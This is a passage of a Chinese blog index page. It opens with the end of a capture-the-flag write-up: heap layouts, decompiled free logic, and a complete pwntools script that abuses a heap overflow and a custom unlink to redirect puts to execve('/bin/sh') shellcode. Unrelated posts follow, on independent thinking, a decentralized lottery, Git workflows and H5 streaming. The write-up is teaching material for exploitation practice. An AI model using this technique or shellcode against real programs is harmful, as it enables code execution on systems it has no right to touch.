<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x603000:      0x0000000000000018      0x0000000000603018           # Head</span><br><span class="line">0x603010:      0x0000000000000000      0x0000000000000031           # First message</span><br><span class="line">0x603020:      0x0000000000603048      0x0000000000603000</span><br><span class="line">0x603030:      0x4141414141414141      0x4141414141414141</span><br><span class="line">0x603040:      0x4141414141414141      0x4141414141414141           # Top chunk</span><br><span class="line">0x603050:      0x4141414141414141      0x0000000000603018</span><br></pre></td></tr></table></figure>

<p>這時候利用 <code>view</code> 他會 output 40 個 A 之後把 <code>0x603018</code> leak 出來，算一下 offset 就可以拿到 <code>0x603000</code> 也就是 heap 的開頭</p>
<p>leak 完之後先把 heap 的 struct 恢復原樣，這邊就不放 layout 了，跟第二個 layout 一樣</p>
<p>恢復之後，在留下新的一則 message size 一樣是 8：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x603000:      0x0000000000000018      0x0000000000603018           # Head</span><br><span class="line">0x603010:      0x0000000000000000      0x0000000000000031           # First message</span><br><span class="line">0x603020:      0x0000000000603048      0x0000000000603000</span><br><span class="line">0x603030:      0x0000000041414141      0x0000000000000000</span><br><span class="line">0x603040:      0x0000000000000000      0x0000000000000031           # Second message</span><br><span class="line">0x603050:      0x0000000000603018      0x0000000000603018</span><br><span class="line">0x603060:      0x0000000042424242      0x0000000000000000</span><br><span class="line">0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk</span><br><span class="line">0x603080:      0x0000000000000000      0x0000000000603048</span><br></pre></td></tr></table></figure>

<p>接著就是要利用 unlink 來讓 puts got.plt 指向我們寫的 shellcode，這邊先來看題目實作的 free code：</p>
<ul>
<li>buf - chunk 儲存 data 的開頭</li>
<li>size_adr - chunk 儲存 size 的位置，也就是 fd, bk 會使用到的 address</li>
<li>buf_bk - bk of current_freed_chunk</li>
<li>buf_fd - fd of current_freed_chunk</li>
<li>qword_6020B0 - 儲存 chunk 的 list</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># list struct</span><br><span class="line">0x6020b0:      0x0000000000603000      0x0000000000000000           # Head  | Nothing</span><br><span class="line">0x6020c0:      0x0000000000603030      0x0000000000603060           # First | Second</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">size_adr = buf<span class="number">-24</span>;</span><br><span class="line">buf_bk = *(_QWORD *)(buf<span class="number">-24</span>+<span class="number">16</span>);</span><br><span class="line">buf_fd = *(_QWORD *)(buf<span class="number">-24</span>+<span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (buf_bk)</span><br><span class="line">    *(_QWORD *)(buf_bk+<span class="number">8</span>) = buf_fd;                         <span class="comment">// 基本上就是讓 buf_bk chunk 的 fd 接到 current_freed_chunk-&gt;fd</span></span><br><span class="line"><span class="keyword">if</span> (buf_fd)</span><br><span class="line">    *(_QWORD *)(buf_fd+<span class="number">16</span>) = buf_bk;                        <span class="comment">// 讓 buf_fd chunk 的 bk 接到 current_freed_chunk-&gt;bk</span></span><br><span class="line">*(_QWORD *)(size_adr+<span class="number">8</span>) = *(_QWORD *)(qword_6020B0+<span class="number">8</span>)       <span class="comment">// 讓 current_freed_chunk-&gt;fd 接到除了 Head 的第一個 chunk</span></span><br><span class="line"><span class="keyword">if</span> (*(_QWORD *)(qword_6020B0+<span class="number">8</span>))</span><br><span class="line">    *(_QWORD *)(*(_QWORD *)(qword_6020B0+<span class="number">8</span>)+<span class="number">16</span>) = size_adr; <span class="comment">// 讓那第一個 chunk 的 bk 接到 current_freed_chunk</span></span><br><span class="line">*(_QWORD *)(qword_6020B0+<span class="number">8</span>) = size_adr;                     <span class="comment">// 讓  Head 的 fd 接到 current_freed_chunk</span></span><br><span class="line">*(_QWORD *)size_adr &amp;= <span class="number">0xFFFFFFFFFFFFFFFE</span>;                  <span class="comment">// clear inuse bit</span></span><br></pre></td></tr></table></figure>

<p>這邊我利用的是讓 buf_bk chunk 的 fd 接到  <code>current_freed_chunk-&gt;fd</code> 這行，我把 buf_bk 設成 <code>puts_got-8</code> 的地方，然後 <code>current_freed_chunk-&gt;fd</code> 設成我寫 shellcode 的地方，這樣就會讓 <code>puts_got</code> 指向 address of shellcode，這樣一來 <code>free</code> 完呼叫 <code>puts</code> 時就會跳到 shellcode 上去執行</p>
<p>所以先用 <code>change</code> 的 overflow 漏洞來改寫 Second Chunk 的 struct，之後再來 free Second Chunk，把他 overflow 成以下樣子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x603000:      0x0000000000000018      0x0000000000603018           # Head</span><br><span class="line">0x603010:      0x0000000000000000      0x0000000000000031           # First message</span><br><span class="line">0x603020:      0x0000000000603048      0x0000000000603000</span><br><span class="line">0x603030:      0x4141414141414141      0x0000000000000000</span><br><span class="line">0x603040:      0x0000000000000000      0x0000000000000031           # Second message</span><br><span class="line">0x603050:      0x00000000006030a8      0x0000000000602010</span><br><span class="line">0x603060:      0x4242424242424242      0x0000000000000000</span><br><span class="line">0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk</span><br><span class="line">0x603080:      0x0000000000000000      0x0000000000603048</span><br><span class="line">0x603090:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6030a0:      0x0000000000000000      0x00000000000016eb</span><br><span class="line">0x6030b0:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6030c0:      shellcode</span><br></pre></td></tr></table></figure>

<ul>
<li><code>0x602010</code> - <code>puts_got-8</code></li>
<li><code>0x6020a8</code> - shellcode 位置</li>
</ul>
<p>這邊會看到 shellcode 位置只擺了 <code>\xeb\x16</code>(jmp 0x18)，這是因為 unlink 的 side-effect，他會在 <code>0x6020a8+16</code> 的位置擺上 buf_bk：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x603000:      0x0000000000000018      0x0000000000603048           # Head</span><br><span class="line">0x603010:      0x0000000000000000      0x0000000000000031           # First message</span><br><span class="line">0x603020:      0x0000000000603048      0x0000000000603048</span><br><span class="line">0x603030:      0x4141414141414141      0x0000000000000000</span><br><span class="line">0x603040:      0x0000000000000000      0x0000000000000030           # Second message</span><br><span class="line">0x603050:      0x00000000006030a8      0x0000000000602010</span><br><span class="line">0x603060:      0x4242424242424242      0x0000000000000000</span><br><span class="line">0x603070:      0x0000000000000000      0x00000000000003a0           # Top chunk</span><br><span class="line">0x603080:      0x0000000000000000      0x0000000000603048</span><br><span class="line">0x603090:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6030a0:      0x0000000000000000      0x00000000000016eb</span><br><span class="line">0x6030b0:      0x0000000000000000      0x0000000000602010 &lt;- buf_bk</span><br><span class="line">0x6030c0:      shellcode</span><br></pre></td></tr></table></figure>

<p>如果直接在 <code>0x6020a8</code> 放上 shellcode 會有一小段 shellcode 被 <code>0x602010</code> 寫爛，所以這邊不能直接放，而是利用了 <code>jmp 0x18</code> 讓 puts 跳過去的時候，再往前跳 <code>0x18</code>，這樣就會跳到 <code>0x6030c0</code> 真正 shellcode 所在的地方了</p>
<p>Final Exploit：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment"># pip install pwntools</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./messenger&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">size, msg</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;msg :&#x27;</span>)</span><br><span class="line">    r.sendline(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, size, payload</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;size :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;msg :&#x27;</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;R&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x602018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak top chunk</span></span><br><span class="line">leave(<span class="number">8</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">60</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">40</span>)</span><br><span class="line">x = r.recvline()[:-<span class="number">1</span>]</span><br><span class="line">heap = u64(x + <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(x))) - <span class="number">0x18</span></span><br><span class="line">log.info(<span class="string">&#x27;heap : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Repair the heap struct</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x3d0</span>) + p64(<span class="number">0</span>) + p64(heap+<span class="number">0x18</span>)</span><br><span class="line">change(<span class="number">0</span>, <span class="number">60</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make another chunk and use overflow to make arbitratary free</span></span><br><span class="line">sc = <span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line">leave(<span class="number">8</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x31</span>) + p64(heap+<span class="number">0xa8</span>) + p64(puts_got-<span class="number">8</span>)</span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x3a0</span>) + p64(<span class="number">0</span>) + p64(heap+<span class="number">0x48</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\xeb\x16&#x27;</span> +<span class="string">&#x27;\x00&#x27;</span>*<span class="number">6</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + sc</span><br><span class="line">change(<span class="number">0</span>, <span class="built_in">len</span>(payload)+<span class="number">4</span>, payload)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/19/2017-02-19-the-important-of-indepentent-thinking/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/19/2017-02-19-the-important-of-indepentent-thinking/" itemprop="url">独立思考的重要性</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-19T22:43:30+08:00">
                2017-02-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="罗辑思维的「逻辑」问题"><a href="#罗辑思维的「逻辑」问题" class="headerlink" title="罗辑思维的「逻辑」问题"></a>罗辑思维的「逻辑」问题</h2><p>我有一段时间很不喜欢罗辑思维，因为我发现他为了证明一个观点，会举一些非常不恰当的例子。而很多例子是可以从多方面来解读的，就像同样一本圣经，却可以成为多个宗教的教义一样。</p>
<p>昨天在微博上看到 @一乐 发了一篇<a target="_blank" rel="noopener" href="http://m.weibo.cn/1819367693/4076303230983269">微博</a>：</p>
<blockquote>
<p>（产品设计）是一个擅长辩论的行业，而在那些雾里看花也没有直观感受的领域，怎么说都有道理，谁都别想说服谁。</p>
</blockquote>
<p>一乐很恰当地说明了这种尴尬的现象。当我们作为程序员写代码的时候，一切都是确定的。但是在非编程领域，包括商业思考，产品设计，UI 设计，营销思路，竞争思路，很难有绝对的对错。</p>
<h2 id="讲故事时必须有明确的观点"><a href="#讲故事时必须有明确的观点" class="headerlink" title="讲故事时必须有明确的观点"></a>讲故事时必须有明确的观点</h2><p>刚刚说我不喜欢罗辑思维拿一些故事来生硬地证明他的观点。但是，我又还是继续在听罗辑思维。为什么呢？因为当我们在讲故事或者阐述观点的时候，我们必须给听众一个确定的内容，这个确定的内容就是一个明确的观点。</p>
<p>我还记得我发表过一篇 <a href="/2016/07/20/from-newbie-to-master/">《成长为 iOS 大 V 的秘密》</a>的文章。一位读者看完后回复得非常切中要害，他说我在文章中故意弱化了我的天赋，而强化了努力和坚持的效果。</p>
<p>我觉得他说得非常对。我在文章中说我毕业于一个计算机排名全国 100 名以外的学校，但是我也可以说我毕业于一个综合排名前 10 的 985 学校，并且我在这个学校的计算机专业成绩排名优秀并保送该校研究生。我可以说我自学 iOS 成才，但是也可以说我在网易时，可以下载有道词典和有道笔记的 iOS 代码资源学习，以及有大量优秀的同事可以帮助我解答自学中的疑问。</p>
<p>那么，我如果这么写文章，大家看了会怎么想呢？文章到底表达了什么观点呢？我其实觉得努力，机遇，天赋都很重要，但是如果要说到底什么是最重要的，我还是觉得是努力。所以我弱化了我的天赋和机遇，强化了努力的作用，以便传达出文章的核心思想。</p>
<p>罗辑思维也是这样，不管他讲什么例子，他都是在用故事试图证明他的观点。也许故事并不太恰当，但是观点本身其实就不是绝对正确的。所以只要把罗胖的观点放在地上思考这个观点的可取之处就可以了，危险的是那些把他的观点捧着举着的人。</p>
<p>这就是为什么张小龙会说「我说的都是错的」，小道消息的冯大辉也会说 「希望文章能给大家启发就好」。时代在变，我们不缺观点，缺的是一种辩证看问题，独立思考的态度。</p>
<h2 id="如何独立思考"><a href="#如何独立思考" class="headerlink" title="如何独立思考"></a>如何独立思考</h2><p>要独立思考，首先要学会吸收不同的观点。在这方面，多读书是最好的方式。书读多了，你自然就会发现不同的书中的观点会有冲突，这就给了你思考的基础。有了这个，你再去思考两种观点最最基本的假设，检查逻辑推导的过程，这样就容易找到对的一方了。</p>
<p>一旦你多次进行独立思考，你就会有意识地「怀疑」一些观点，然后利用自己的已有知识或者进行适当地网上搜索学习，你就可以验证自己的怀疑是否正确，从进培养起自己独立思考的能力。</p>
<p>如果打个比方，那么独立思考就是把别人嚼碎的食物还原，自己嚼一遍，因为只有自己嚼一遍，才能知道口感是不是真的好。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们选罗辑思维第 200 期《古典：超级个体》中的一个观点来挑战一下。这一期不是罗胖主持的，按理说应该挑罗胖自己讲的内容，但是我确实没有动机专门挑他的毛病，所以只能凭印象找最近的一期。这期节目中讲到，人以后的寿命变长，会使得婚姻很容易破裂。而他的理由是：夫妻之间婚姻的稳固，大多数是由于年轻的时候需要共同抚养孩子，年老之后不再好重新找伴侣只好将就过。</p>
<p>但是我正好看了《少有人走的路》这一本书，这里面提到了正确的婚姻价值观。所以，这一期节目中的这个例子，在很多家庭中应该是对的，但是这仅表示这些家庭成员缺少正确的对待婚姻的态度。有了这样的思考，我其实看待这个观点就更加成熟了。</p>
<p>我们生活中类似的需要独立思考的观点还有很多，大家都可以想一下，比如：</p>
<ul>
<li>今日头条真的只是一个「新闻客户端」吗？</li>
<li>为什么很多大公司继续使用 Objective-C，不用 Swift？</li>
</ul>
<p>这个时代人云亦云最可怕了，希望大家都能够有独立思考的能力。</p>
<p>与君共勉。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/19/2017/2017-02-19-distributed-random-rollup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/19/2017/2017-02-19-distributed-random-rollup/" itemprop="url">Rollup: 去中心化随机抽奖程序</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-19T00:00:00+08:00">
                2017-02-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在春节前后，经常在社区中看到有关年会抽奖程序的讨论，其中抽奖的公平性是被大家讨论得最多的点。可能有的人会说可以用 random.org 来取随机数，的确这个网站可以保证数字的随机性，但如果访问 random.org 的浏览器位于一台计算机上，如何证明这个随机数确实来自 random.org 呢？<strong>如何确定这台计算机从软件到硬件、从操作系统到网络接口都没有被动过手脚呢</strong>？</p>
<p>所以我们需要一种「可验证」的随机数生成算法，即 <strong>这个算法不应该是运行在单个设备上的，而是可以在不同的设备上多次运行，并且总是得到相同的结果</strong>，这样才能被大家信服 —— 每个人都可以在自己的设备上进行验算。</p>
<p>其实说来直接使用比特币下一个区块的 hash，或者股市收盘价格作为随机数是最简单、最具有可行性的做法了。但这并不是说比特币（矿工可以有选择性地提交区块来影响随机数）或股市不能被操控，而只是相对于我们的年会抽奖来说，他们的体量都太大了，去操控比特币或股市是不划算的。</p>
<p>于是我想能否利用之前了解到的去中心化和区块链的知识，来实现一个去中心化的、可验算的、难以操控的抽奖程序，让这个抽奖程序以分布式的方式运行在所有参与者的设备上，会有一个后端服务器帮助客户端进行广播，但本身没有特权，客户端会对随机数的产生过程进行验算，确保没有人作弊。</p>
<p>其实在 Ethereum（一个类似比特币的区块链）上已经有了非常成熟的 <a target="_blank" rel="noopener" href="https://github.com/randao/randao">随机数生成器</a>，它基于「两阶段提交」来实现，在第一阶段每个人生成一个随机数，并将这个随机数的 hash 广播出去；然后在第二阶段之前的参与者再广播随机数的明文，然后将所有参与者的随机数加到一起，形成一个无法被任何操纵的随机数。</p>
<p>这个算法的要点在于，在第一阶段中每个人都选定了一个数字，但广播的却是数字的 hash，也就是说你没办法知道其他人选定的数字，也就无法去构造特定的数字来影响结果；而在第二阶段大家才开始广播真正的数字，同时每个人都会使用之前的 hash 进行验算，保证这时的数字与第一阶段相同。</p>
<p>我将这个算法进行了细化，在浏览器中用 React 实现了客户端，再用 Node.js 实现了一个基于 WebSocket 的服务器来辅助广播。大家可以在 <a target="_blank" rel="noopener" href="https://rollup.leanapp.cn/">rollup.leanapp.cn</a> 访问到这个原型（源代码和详细算法位于 <a target="_blank" rel="noopener" href="https://github.com/jysperm/rollup">jysperm&#x2F;rollup</a>），可以自己开多个浏览器窗口进行测试：</p>
<p><img src="https://r2-lc-cn.jysperm.me/pictures/2017/rollup-screenshot.png"></p>
<p>如果有人捣乱会怎么样，比如在第二阶段广播了错误的数字或者根本没有广播呢？在 Ethereum 上这会给参与者带来经济上的惩罚。而在我们的原型中，我们只能做到感知到这些作弊的情况，然后中止抽奖，如果有人执意捣乱，就会导致抽奖一直无法完成了。</p>
<p>那是不是说这个原型已经做到无懈可击了呢？并不是，目前是使用单一的后端来实现广播，如果这个后端有选择性地不对特定的客户端广播一些消息，就会导致这个特定的客户端被孤立，和其他人产生不同的抽奖结果，而且这个被孤立的客户端也无从证明究竟是后端没有广播，还是自己忽略了广播。</p>
<p>更好的设计可能是通过真正 P2P 的方式进行广播，这样除非其他所有参与者联合起来孤立一部分人，否则其他参与者就可以从未参与攻击的人哪里得到正确的广播。然而真正的 P2P 其实是没办法实现的 —— 你总是需要一个用作服务发现的节点，同时也要考虑通讯信道的安全性，当前的密码学技术虽然可能保证消息不被篡改，但却无法保证消息不丢失。</p>
<p>关于区块链的更多知识可参考我之前的文章 <a target="_blank" rel="noopener" href="https://jysperm.me/2016/05/blockchain-slides/">BlockChain 与 Ethereum 介绍</a>，其中也有对 Ethereum 上的随机数生成器的详细讨论。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/17/Git%E5%B7%A5%E4%BD%9C%E6%B5%81%E4%B9%8B%E4%B8%80--%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%B7%A5%E4%BD%9C%E6%B5%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/17/Git%E5%B7%A5%E4%BD%9C%E6%B5%81%E4%B9%8B%E4%B8%80--%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%B7%A5%E4%BD%9C%E6%B5%81/" itemprop="url">Git工作流之一(集中式工作流)</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-17T00:08:54+08:00">
                2017-02-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><h2 id="一言不合讲个小故事"><a href="#一言不合讲个小故事" class="headerlink" title="一言不合讲个小故事"></a>一言不合讲个小故事</h2>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/17/Git%E5%B7%A5%E4%BD%9C%E6%B5%81%E4%B9%8B%E4%B8%80--%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%B7%A5%E4%BD%9C%E6%B5%81/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/14/%E6%89%AB%E7%9B%B2%E7%AC%94%E8%AE%B0-H5%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/14/%E6%89%AB%E7%9B%B2%E7%AC%94%E8%AE%B0-H5%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD/" itemprop="url">扫盲笔记--H5视频直播</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
